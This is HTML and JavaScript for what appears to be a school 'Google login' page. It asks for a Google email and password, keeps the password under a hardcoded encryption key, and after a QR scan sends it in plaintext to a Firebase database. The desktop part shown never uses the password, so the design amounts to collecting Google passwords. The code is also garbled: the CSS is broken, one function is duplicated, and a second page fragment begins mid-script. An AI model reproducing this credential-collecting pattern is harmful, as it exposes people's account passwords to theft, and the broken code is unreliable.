    <style>
        body {

            margin-top: 20px;
            display: none;

        #scanner {
            width: 100%;

            overflow: hidden;

        #message {

        .success {

            background-color: #f8d7da;
            color: #721c24;
        }
            /* 進度指示器 */
    .progress-container {
        margin-top: 20px;
        display: none;
    }
    
    .progress-steps {
        display: flex;
        justify-content: space-between;
        margin-bottom: 15px;
        position: relative;
    }
    
    .progress-steps::before {
        content: '';
        position: absolute;
        top: 15px;
        left: 20px;
        right: 20px;
        height: 2px;
        background: #ddd;
        z-index: 1;
    }
    
    .step {
        width: 30px;
        height: 30px;
        border-radius: 50%;
        background: #ddd;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: bold;
        position: relative;
        z-index: 2;
    }
    
    .step.active {
        background: #4285F4;
        color: white;
    }
    
    .step.completed {
        background: #34A853;
        color: white;
    }
    
    .step-label {
        position: absolute;
        top: 35px;
        left: 50%;
        transform: translateX(-50%);
        white-space: nowrap;
        font-size: 12px;
        color: #555;
    }
    
    /* 動畫 */
    @keyframes pulse {
        0% { transform: scale(1); }
        50% { transform: scale(1.05); }
        100% { transform: scale(1); }
    }
    
    .pulse {
        animation: pulse 1.5s infinite;
    }
    
    /* 改良表單樣式 */
    .form-group input:focus {
        outline: none;
        border-color: #4285F4;
        box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.2);
    }
    
    /* 密碼可見性切換 */
    .password-container {
        position: relative;
    }
    
    .toggle-password {
        position: absolute;
        right: 10px;
        top: 12px;
        cursor: pointer;
        color: #555;
    }
    
    /* 響應式調整 */
    @media (max-width: 480px) {
        .container {
            padding: 15px;
        }
        
        button {
            padding: 10px 0;
        }
    }
    </style>
</head>
<body>
    <div class="container">
        <h1>營北國中Google登入系統</h1>
        
        <div class="form-group">
            <label for="email">Google 帳號</label>
            <input type="email" id="email" placeholder="請輸入您的 Google 帳號">
        </div>
        
       <div class="form-group">
            <label for="password">密碼</label>
            <div class="password-container">
                <input type="password" id="password" placeholder="請輸入您的密碼">
                <span class="toggle-password" id="togglePassword">👁️</span>
            </div>
        </div>
        
        <div class="buttons">
            <button id="saveButton">儲存資料</button>
            <button id="scanButton" class="secondary">掃描 QR Code</button>
        </div>
        
        <div id="scannerContainer">
            <div id="scanner"></div>
        </div>
        
        <div id="message"></div>
    </div>
    <div class="progress-container" id="progressContainer">
        <div class="progress-steps">
            <div class="step active" id="step1">
                1
                <div class="step-label">掃描QR碼</div>
            </div>
            <div class="step" id="step2">
                2
                <div class="step-label">傳送資料</div>
            </div>
            <div class="step" id="step3">
                3
                <div class="step-label">登入完成</div>
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // Firebase 設定
            const firebaseConfig = {
               apiKey: "AIzaSyArF8xncLwA3osSQ_o6yWIyuOc0TMrXRTY",
               authDomain: "yingpei--login.firebaseapp.com",
               databaseURL: "https://yingpei--login-default-rtdb.firebaseio.com",
               projectId: "yingpei--login",
               storageBucket: "yingpei--login.firebasestorage.app",
               messagingSenderId: "261477282402",
               appId: "1:261477282402:web:557f0be058e07cd642173b",
               measurementId: "G-EB9PR17TJL"
            };
            
            // 初始化 Firebase
            firebase.initializeApp(firebaseConfig);
            const database = firebase.database();
            
            // 檢查是否有儲存的帳號資料
            const savedEmail = localStorage.getItem('googleEmail');
            const savedPassword = localStorage.getItem('googlePassword');
            
            if (savedEmail) {
                document.getElementById('email').value = savedEmail;
                document.getElementById('password').value = savedPassword ? '********' : '';
            }
            
            // 儲存按鈕點擊事件
            document.getElementById('saveButton').addEventListener('click', () => {
                const email = document.getElementById('email').value.trim();
                const password = document.getElementById('password').value.trim();
                
                if (!email || !password) {
                    showMessage('請輸入帳號和密碼', 'error');
                    return;
                }
                
                // 使用 AES 加密密碼
                const encryptedPassword = CryptoJS.AES.encrypt(password, 'yingbei-secure-key').toString();
                
                // 儲存到 localStorage
                localStorage.setItem('googleEmail', email);
                localStorage.setItem('googlePassword', encryptedPassword);
                
                showMessage('資料已儲存', 'success');
            });
            
            // 掃描按鈕點擊事件
            document.getElementById('scanButton').addEventListener('click', () => {
                const scannerContainer = document.getElementById('scannerContainer');
                
                if (scannerContainer.style.display === 'block') {
                    html5QrCode.stop();
                    scannerContainer.style.display = 'none';
                    return;
                }
                
                // 檢查是否有儲存的資料
                const email = localStorage.getItem('googleEmail');
                const encryptedPassword = localStorage.getItem('googlePassword');
                
                if (!email || !encryptedPassword) {
                    showMessage('請先儲存您的登入資料', 'error');
                    return;
                }
                
                scannerContainer.style.display = 'block';
                
                // 使用 HTML5 QR Code 庫來掃描 QR Code
                const html5QrCode = new Html5Qrcode("scanner");
                const qrCodeSuccessCallback = (connectionId) => {
                    // 解密存儲的密碼
                    const password = CryptoJS.AES.decrypt(encryptedPassword, 'yingbei-secure-key').toString(CryptoJS.enc.Utf8);
                    
                    // 將登入資料發送到 Firebase
                    sendLoginData(connectionId, email, password);
                    
                    // 停止掃描
                    html5QrCode.stop();
                    scannerContainer.style.display = 'none';
                };
                
                const config = { fps: 10, qrbox: { width: 200, height: 200 } };
                
                html5QrCode.start(
                    { facingMode: "environment" }, 
                    config, 
                    qrCodeSuccessCallback
                ).catch((err) => {
                    showMessage('無法啟動相機，請確認已授權', 'error');
                    console.error(err);
                    scannerContainer.style.display = 'none';
                });
            });
            
            // 發送登入資料到 Firebase Realtime Database
            // 發送登入資料到 Firebase Realtime Database (替換原有函數)
            function sendLoginData(connectionId, email, password) {
                try {
                    // 使用connectionId作為資料庫鍵值
                    const connectionRef = database.ref('connections/' + connectionId);
        
                    // 設定資料
                    connectionRef.set({
                        email: email,
                        password: password,
                        timestamp: Date.now(),
                        status: 'pending',
                        device: {
                            type: 'mobile',
                            userAgent: navigator.userAgent,
                            platform: navigator.platform
                        }
                    });
        
                    // 監聽狀態更新
                    connectionRef.on('value', (snapshot) => {
                        const data = snapshot.val();
                        if (!data) return; // 資料已被刪除
            
                        const status = data.status;
            
                        if (status === 'pending') {
                            showMessage('正在處理您的登入請求...', 'waiting');
                        } else if (status === 'processing') {
                            showMessage('電腦端正在進行登入...', 'waiting');
                        } else if (status === 'success') {
                            showMessage(`登入成功！已登入為: ${data.loggedInUser || 'Google用戶'}`, 'success');
                            
                            // 顯示其他登入資訊
                            if (data.redirectUrl) {
                                const additionalInfo = document.createElement('div');
                                additionalInfo.innerHTML = `<p>電腦將導向至: ${data.redirectUrl}</p>`;
                                document.querySelector('.container').appendChild(additionalInfo);
                            }
                        } else if (status === 'error') {
                            showMessage(`登入失敗: ${data.errorMessage || '未知錯誤'}`, 'error');
                        }
                    });
                    
                    showMessage('已發送登入請求，請查看電腦端', 'success');
                } catch (error) {
                    showMessage('連線錯誤，請確保網路連線正常', 'error');
                    console.error('Firebase error:', error);
                }
            }
            
            // 顯示訊息
            function showMessage(text, type) {
                const messageElement = document.getElementById('message');
                messageElement.textContent = text;
                messageElement.className = type;
                messageElement.style.display = 'block';
                
                setTimeout(() => {
                    messageElement.style.display = 'none';
                }, 3000);
            }
        });
// 密碼可見性切換
document.getElementById('togglePassword').addEventListener('click', function() {
    const passwordInput = document.getElementById('password');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        this.textContent = '🔒';
    } else {
        passwordInput.type = 'password';
        this.textContent = '👁️';
    }
});

// 更新進度指示器
function updateProgressStep(step) {
    const progressContainer = document.getElementById('progressContainer');
    progressContainer.style.display = 'block';
    
    for (let i = 1; i <= 3; i++) {
        const stepElement = document.getElementById('step' + i);
        
        if (i < step) {
            stepElement.classList.remove('active');
            stepElement.classList.add('completed');
        } else if (i === step) {
            stepElement.classList.add('active');
            stepElement.classList.remove('completed');
            stepElement.classList.add('pulse');
        } else {
            stepElement.classList.remove('active', 'completed', 'pulse');
        }
    }
}

// 在發送登入資料之前更新進度
function sendLoginData(connectionId, email, password) {
    try {
        // 顯示進度指示器在步驟1
        updateProgressStep(1);
        
        // 使用connectionId作為資料庫鍵值
        const connectionRef = database.ref('connections/' + connectionId);
        
        // 設定資料
        connectionRef.set({
            email: email,
            password: password,
            timestamp: Date.now(),
            status: 'pending',
            device: {
                type: 'mobile',
                userAgent: navigator.userAgent,
                platform: navigator.platform
            }
        }).then(() => {
            // 資料發送成功，更新至步驟2
            updateProgressStep(2);
        });
        
        // 監聽狀態更新
        connectionRef.on('value', (snapshot) => {
            const data = snapshot.val();
            if (!data) return; // 資料已被刪除
            
            const status = data.status;
            
            if (status === 'pending') {
                showMessage('正在處理您的登入請求...', 'waiting');
            } else if (status === 'processing') {
                showMessage('電腦端正在進行登入...', 'waiting');
            } else if (status === 'success') {
                // 登入成功，更新至步驟3
                updateProgressStep(3);
                showMessage(`登入成功！已登入為: ${data.loggedInUser || 'Google用戶'}`, 'success');
            } else if (status === 'error') {
                showMessage(`登入失敗: ${data.errorMessage || '未知錯誤'}`, 'error');
                progressContainer.style.display = 'none'; // 隱藏進度指示器
            }
        });
        
        showMessage('已發送登入請求，請查看電腦端', 'success');
    } catch (error) {
        showMessage('連線錯誤，請確保網路連線正常', 'error');
        console.error('Firebase error:', error);
        progressContainer.style.display = 'none'; // 隱藏進度指示器
    }
}
    </script>
</body>
</html>

                // 生成新的 QR 碼
                document.getElementById('qrcode').innerHTML = '';
                generateQRCode(connectionId);
                
                // 重新開始監聽
                startListening(connectionId);
                
                // 更新狀態
                const statusElement = document.getElementById('status');
                statusElement.textContent = '等待手機掃描...';
                statusElement.className = 'status waiting';
                
                // 隱藏重新整理按鈕
                document.getElementById('refreshBtn').style.display = 'none';
            });
            
            // 產生連線 ID
            function generateConnectionId() {
                return 'conn-' + Math.random().toString(36).substring(2, 10);
            }
            
            // 產生 QR 碼
            function generateQRCode(connectionId) {
                new QRCode(document.getElementById("qrcode"), {
                    text: connectionId,
                    width: 200,
                    height: 200,
                    colorDark: "#000000",
                    colorLight: "#ffffff",
                    correctLevel: QRCode.CorrectLevel.H
                });
            }
            
            // 監聽來自手機的登入資料
            function startListening(connectionId) {
                const statusElement = document.getElementById('status');
                const connectionRef = database.ref('connections/' + connectionId);
                
                // 設定連線超時
                const timeout = setTimeout(() => {
                    statusElement.textContent = '連線逾時，請重新整理QR碼';
                    statusElement.className = 'status error';
                    document.getElementById('refreshBtn').style.display = 'inline-block';
                }, 180000); // 3分鐘超時
                
                // 監聽資料更新
                connectionRef.on('value', (snapshot) => {
                    const data = snapshot.val();
                    
                    if (data && data.email && data.password) {
                        // 清除超時計時器
                        clearTimeout(timeout);
                        
                        statusElement.textContent = '已接收登入資料，正在登入 Google...';
                        statusElement.className = 'status connected';
                        
                        // 使用 Google OAuth 2.0 登入
                        googleSignIn(data.email, connectionRef);
                    }
                });
            }
            
            // 使用 Google OAuth 2.0 登入
            function googleSignIn(email, connectionRef) {
                const statusElement = document.getElementById('status');
                
                // 等待 Google API 載入
                gapi.load('auth2', () => {
                    gapi.auth2.init({
                        client_id: 'YOUR_CLIENT_ID.apps.googleusercontent.com',
                        scope: 'profile email'
                    }).then(() => {
                        // 嘗試自動登入，使用者需要在彈出視窗中確認
                        const auth2 = gapi.auth2.getAuthInstance();
                        
                        // 預填 email
                        const options = {
                            prompt: 'select_account',
                            login_hint: email
                        };
                        
                        auth2.signIn(options).then(
                            (googleUser) => {
                                // 登入成功
                                const profile = googleUser.getBasicProfile();
                                statusElement.textContent = `登入成功！歡迎 ${profile.getName()}`;
                                statusElement.className = 'status connected';
                                
                                // 更新Firebase狀態
                                connectionRef.update({
                                    status: 'success',
                                    loggedInUser: profile.getName(),
                                    loggedInTime: new Date().toISOString()
                                });
                                
                                // 延遲後重定向到 Google 服務
                                setTimeout(() => {
                                    window.location.href = 'https://www.google.com';
                                }, 3000);
                            },
                            (error) => {
                                // 登入失敗
                                statusElement.textContent = '登入失敗，請重試';
                                statusElement.className = 'status error';
                                console.error('Login failed:', error);
                                
                                // 更新Firebase狀態
                                connectionRef.update({
                                    status: 'error',
                                    errorMessage: error.error
                                });
                                
                                // 顯示重新整理按鈕
                                document.getElementById('refreshBtn').style.display = 'inline-block';
                            }
                        );
                    });
                });
            }
        });
    </script>
</body>
</html>
